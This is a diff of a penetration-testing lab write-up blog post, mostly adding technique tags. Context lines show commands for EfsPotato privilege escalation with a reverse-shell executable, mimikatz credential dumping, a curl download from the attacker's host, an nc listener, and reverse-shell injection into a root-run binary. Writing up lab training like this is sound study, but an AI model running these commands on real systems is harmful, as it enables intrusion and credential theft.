@@ -6,9 +6,20 @@ ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-01-14T17:30:02.408Z
+  - Web-SourceCode-DataLeak
+  - CVE-2021-44087
+  - Lateral-Movement-mimikatz
+  - Windows-Privilege-Escalation-windows-Files
+  - CVE-2020-13151
+  - Linux-Privilege-Escalation-link-Injection
+  - web-github-abuse
+  - Linux-Privilege-Escalation-backupfile
+  - Windows-Privilege-Escalation-Putty
+lastmod: 2026-02-07T07:02:43.376Z
 ---
 # Box Info
+
+This lab involves a sophisticated attack chain against an Active Directory environment. Learners begin by exploiting a vulnerable webapp to achieve remote code execution, followed by privilege escalation Privilege abuse. Through lateral movement, pivoting across network segments, and cracking Kerberos tickets, learners must enumerate and compromise domain assets to achieve full domain control.
 
 ```
 10.10.188.140
@@ -356,6 +367,12 @@ Then edit where your GPO.ps1 is located and run in power shell
 ```
 
 ### Web Reco 81
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Web-SourceCode-DataLeak" >}} The website source code leak the page of attendance.php which leak the password
+
+{{< /toggle >}}
 
 ![Pasted image 20251215143255.png](/ob/Pasted%20image%2020251215143255.png)\
 ![Pasted image 20251215144325.png](/ob/Pasted%20image%2020251215144325.png)\
@@ -756,11 +773,18 @@ Then edit where your GPO.ps1 is located and run in power shell
 
 ```
 
-Found the http://192.168.208.141:81/db/ with the database hashes, but it is faled
+Found the http://192.168.208.141:81/db/ with the database hashes, but it is failed
 
 ![Pasted image 20251215150836.png](/ob/Pasted%20image%2020251215150836.png)
 
-![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)\
+![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "CVE-2021-44087" >}} The webapp reveals that the website is using the Attendance and Payroll System which is easy to be attack as the RCE
+
+{{< /toggle >}}
+
 The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801
 
 ![Pasted image 20251215151425.png](/ob/Pasted%20image%2020251215151425.png)
@@ -806,6 +830,12 @@ EfsPotato.exe "C:\ProgramData\reverse.exe" netlogon
 ```
 
 ![Pasted image 20251215153115.png](/ob/Pasted%20image%2020251215153115.png)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag " Lateral-Movement-mimikatz" >}} mimikatz.exe use the command of sekurlsa::logonpasswords to found the new cred of user 's NTLM
+
+{{< /toggle >}}
 
 ```shell
 C:\mimikatz_trunk\x64>mimikatz.exe
@@ -1333,6 +1363,12 @@ Info: Establishing connection to remote endpoint
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-windows-Files" >}} The windows.old file should not be here , which will backup a lot of sensitive data
+
+{{< /toggle >}}
+
 Windows old should not be here\
 ![Pasted image 20251215160528.png](/ob/Pasted%20image%2020251215160528.png)
 
@@ -1440,6 +1476,13 @@ ftp: Login failed
 ftp> 
 ```
 
+### CVE-2020-13151
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "CVE-2020-13151" >}} The port 3003 with the help command show that the cms version and it also easy to be RCE attack\
+{{< /toggle >}}
+
 https://github.com/b4ny4n/CVE-2020-13151
 
 ### port 3003
@@ -1453,8 +1496,6 @@ version
 ```
 
 ![Pasted image 20260109150533.png](/ob/Pasted%20image%2020260109150533.png)
-
-### CVE-2020-13151
 
 ```
 └─# sudo nc -lvnp 80
@@ -1494,6 +1535,11 @@ $ curl -L http://192.168.45.193:21/pspy64 -o pspy64
 $ 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-Escalation-link-Injection" >}} pspy64 reveal that /usr/bin/asinfo (own by root )will auto run , and the /opt/aerospike/bin/asinfo (own by aero ) is linked to /usr/bin/asinfo, so when i inject the revshell to the /opt/aerospike/bin/asinfo , i will be root\
+{{< /toggle >}}
+
 ```
 $ chmod +x pspy64
 $ timeout  120 ./pspy64  -pf -i 1000
@@ -1522,10 +1568,6 @@ done
 it appear every 10 sec , so we may use it\
 ![Pasted image 20260109153903.png](/ob/Pasted%20image%2020260109153903.png)
 
-![Pasted image 20260109154022.png](/ob/Pasted%20image%2020260109154022.png)
-
-![Pasted image 20260109154320.png](/ob/Pasted%20image%2020260109154320.png)
-
 ```
 aero@oscp:/tmp$ ls -al /usr/bin/asinfo
 lrwxrwxrwx 1 root root 25 Dec  7  2019 /usr/bin/asinfo -> /opt/aerospike/bin/asinfo
@@ -1535,9 +1577,9 @@ aero@oscp:/tmp$ whoami
 aero
 ```
 
-![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)
+![Pasted image 20260207144417.png](/ob/Pasted%20image%2020260207144417.png)
 
-next for this : https://hackmd.io/@roger102/S1Zc6uHzgg#144-%E2%80%93gt-prooftxt
+![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)
 
 # 192.168.X.144
 
@@ -1613,27 +1655,6 @@ Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
                                                                                                     
 ```
 
-### \[\[FTP 21]] -- Scans
-
-```
-└─# ftp 192.168.136.144 
-Connected to 192.168.136.144.
-220 (vsFTPd 3.0.5)
-Name (192.168.136.144:root): stuart
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> dir
-229 Entering Extended Passive Mode (|||13704|)
-150 Here comes the directory listing.
--rw-rw-r--    1 1000     1000           33 Jan 14 14:00 local.txt
-226 Directory send OK.
-ftp> 
-
-```
-
 ### \[\[SSH 22]] -- Scans
 
 ```
@@ -1673,13 +1694,6 @@ stuart@oscp:~$
 
 ```
 
-### \[\[Unkown Port]] -- Scans
-
-> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。
-
-```
-```
-
 ***
 
 # Web Recon 80
@@ -1687,6 +1701,12 @@ stuart@oscp:~$
 ![Pasted image 20260114221737.png](/ob/Pasted%20image%2020260114221737.png)
 
 ![Pasted image 20260114221855.png](/ob/Pasted%20image%2020260114221855.png)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "web-github-abuse" >}} Found the password via .git/ backup file in the database.php
+
+{{< /toggle >}}
 
 ### \[\[git recon]]
 
@@ -1873,7 +1893,51 @@ index 0000000..55b1645
 
 ```
 
+### \[\[SSH 22]] -- Scans
+
+```
+└─#  ssh stuart@192.168.136.144 
+The authenticity of host '192.168.136.144 (192.168.136.144)' can't be established.
+ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.136.144' (ED25519) to the list of known hosts.
+stuart@192.168.136.144's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jan 14 03:32:39 PM UTC 2026
+
+  System load:  0.0                Processes:               203
+  Usage of /:   40.4% of 18.53GB   Users logged in:         0
+  Memory usage: 11%                IPv4 address for ens160: 192.168.136.144
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
+stuart@oscp:~$ 
+
+```
+
 ### stuart to chloe(backup file cred leak)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-Escalation-backupfile" >}} Found the backup file in the /opt ,hashcat find the password, in the /jo.omla/configuration.php find the another password\
+{{< /toggle >}}
 
 ![Pasted image 20260114234116.png](/ob/Pasted%20image%2020260114234116.png)
 
@@ -2132,6 +2196,12 @@ Nmap done: 1 IP address (1 host up) scanned in 200.06 seconds
 ### offsec to admin (Registry Cred leak)
 
 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Escalation-Putty" >}} Enumeration for PuTTY Credentials in Registry to find the admin password
+
+{{< /toggle >}}
 
 ![Pasted image 20260115012619.png](/ob/Pasted%20image%2020260115012619.png)
 
